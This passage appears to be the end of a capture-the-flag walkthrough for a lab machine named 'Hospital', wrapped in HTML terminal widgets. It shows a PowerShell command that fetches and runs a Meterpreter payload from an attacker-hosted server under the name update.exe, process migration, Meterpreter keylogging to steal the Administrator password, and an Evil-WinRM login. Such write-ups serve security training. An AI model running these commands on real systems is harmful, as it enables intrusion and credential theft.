3. Execute the payload remotely on the through PowerShell after hosting the meter.exe via Python http Server:

<div class="terminal-container">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">PowerShell Command</span>
        <button class="copy-btn" onclick="copyToClipboard(this)">
            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
                <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
            </svg>
        </button>
    </div>
    <div class="terminal-body">
        <pre><code class="language-bash">(New-Object Net.WebClient).DownloadFile('http://IP/meter.exe', 'C:\Users\drbrown.HOSPITAL\Documents\update.exe'); Start-Process 'C:\Users\drbrown.HOSPITAL\Documents\update.exe'</code></pre>
    </div>
</div>

<style>
.terminal-container {
    background-color: #121212;
    border-radius: 10px;
    box-shadow: 0 4px 6px rgba(0,0,0,0.2);
    margin: 20px 0;
    overflow: hidden;
    position: relative;
}
.terminal-header {
    background-color: #1c1c1c;
    padding: 10px;
    display: flex;
    align-items: center;
    justify-content: center;
    position: relative;
}
.terminal-dot {
    width: 12px;
    height: 12px;
    border-radius: 50%;
    position: absolute;
    left: 10px;
}
.terminal-dot.red { background-color: #ff3b30; }
.terminal-dot.yellow { background-color: #ffcc00; }
.terminal-dot.green { background-color: #4cd964; }
.terminal-title {
    color: #a0a0a0;
    font-family: monospace;
    font-weight: bold;
}
.terminal-body {
    padding: 15px;
    background-color: #0a0a0a;
    color: #00ff00;
    font-family: 'Courier New', monospace;
}
.terminal-body pre {
    margin: 0;
    white-space: pre-wrap;
}
.copy-btn {
    position: absolute;
    right: 10px;
    background: none;
    border: none;
    color: #a0a0a0;
    cursor: pointer;
    transition: color 0.3s ease;
}
.copy-btn:hover {
    color: #fff;
}
</style>

<script>
function copyToClipboard(btn) {
    const code = btn.closest('.terminal-container').querySelector('code').textContent;
    navigator.clipboard.writeText(code).then(() => {
        btn.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>';
        setTimeout(() => {
            btn.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>';
        }, 1500);
    });
}
</script>

Once the session opens, background it and upgrade to a fully upgraded Meterpreter Session:

<div class="terminal-container">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Upgrading to fully upgraded Meterpreter Session</span>
        <button class="copy-btn" onclick="copyToClipboard(this)">
            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
                <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
            </svg>
        </button>
    </div>
    <div class="terminal-body">
        <pre><code class="language-bash">background
sessions -u 1
sessions -i 2</code></pre>
    </div>
</div>

<style>
.terminal-container {
    background-color: #121212;
    border-radius: 10px;
    box-shadow: 0 4px 6px rgba(0,0,0,0.2);
    margin: 20px 0;
    overflow: hidden;
    position: relative;
}
.terminal-header {
    background-color: #1c1c1c;
    padding: 10px;
    display: flex;
    align-items: center;
    justify-content: center;
    position: relative;
}
.terminal-dot {
    width: 12px;
    height: 12px;
    border-radius: 50%;
    position: absolute;
    left: 10px;
}
.terminal-dot.red { background-color: #ff3b30; }
.terminal-dot.yellow { background-color: #ffcc00; }
.terminal-dot.green { background-color: #4cd964; }
.terminal-title {
    color: #a0a0a0;
    font-family: monospace;
    font-weight: bold;
}
.terminal-body {
    padding: 15px;
    background-color: #0a0a0a;
    color: #00ff00;
    font-family: 'Courier New', monospace;
}
.terminal-body pre {
    margin: 0;
    white-space: pre-wrap;
}
.copy-btn {
    position: absolute;
    right: 10px;
    background: none;
    border: none;
    color: #a0a0a0;
    cursor: pointer;
    transition: color 0.3s ease;
}
.copy-btn:hover {
    color: #fff;
}
</style>

<script>
function copyToClipboard(btn) {
    const code = btn.closest('.terminal-container').querySelector('code').textContent;
    navigator.clipboard.writeText(code).then(() => {
        btn.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>';
        setTimeout(() => {
            btn.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>';
        }, 1500);
    });
}
</script>

<img src="https://i.ibb.co/FvZTF74/15.png" alt="Hospital" width="750">

We then list processes with ps and migrate to one of the active ones, which was opened by the user drbrown:

- `migrate <PID>`

<img src="https://i.ibb.co/KJG1ZRs/16.png" alt="Hospital" width="750">

Start the Key-Logger with:

- `keyscan_start`

and after a few minutes, dump the key strokes, which were sent by the user drbrown

- `keyscan_dump`

<img src="https://i.ibb.co/WW5Gn7S6/17.png" alt="Hospital" width="750">

We successfully capture the Administrator password and now can use Evil-WinRM to log in:

<div class="terminal-container">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Evil-WinRM</span>
        <button class="copy-btn" onclick="copyToClipboard(this)">
            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
                <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
            </svg>
        </button>
    </div>
    <div class="terminal-body">
        <pre><code class="language-bash">evil-winrm -i IP -u Administrator -p PASS</code></pre>
    </div>
</div>

<style>
.terminal-container {
    background-color: #121212;
    border-radius: 10px;
    box-shadow: 0 4px 6px rgba(0,0,0,0.2);
    margin: 20px 0;
    overflow: hidden;
    position: relative;
}
.terminal-header {
    background-color: #1c1c1c;
    padding: 10px;
    display: flex;
    align-items: center;
    justify-content: center;
    position: relative;
}
.terminal-dot {
    width: 12px;
    height: 12px;
    border-radius: 50%;
    position: absolute;
    left: 10px;
}
.terminal-dot.red { background-color: #ff3b30; }
.terminal-dot.yellow { background-color: #ffcc00; }
.terminal-dot.green { background-color: #4cd964; }
.terminal-title {
    color: #a0a0a0;
    font-family: monospace;
    font-weight: bold;
}
.terminal-body {
    padding: 15px;
    background-color: #0a0a0a;
    color: #00ff00;
    font-family: 'Courier New', monospace;
}
.terminal-body pre {
    margin: 0;
    white-space: pre-wrap;
}
.copy-btn {
    position: absolute;
    right: 10px;
    background: none;
    border: none;
    color: #a0a0a0;
    cursor: pointer;
    transition: color 0.3s ease;
}
.copy-btn:hover {
    color: #fff;
}
</style>

<script>
function copyToClipboard(btn) {
    const code = btn.closest('.terminal-container').querySelector('code').textContent;
    navigator.clipboard.writeText(code).then(() => {
        btn.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>';
        setTimeout(() => {
            btn.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>';
        }, 1500);
    });
}
</script>

Once inside, we grab the root.txt file from the desktop. Hospital has been hacked. Game over.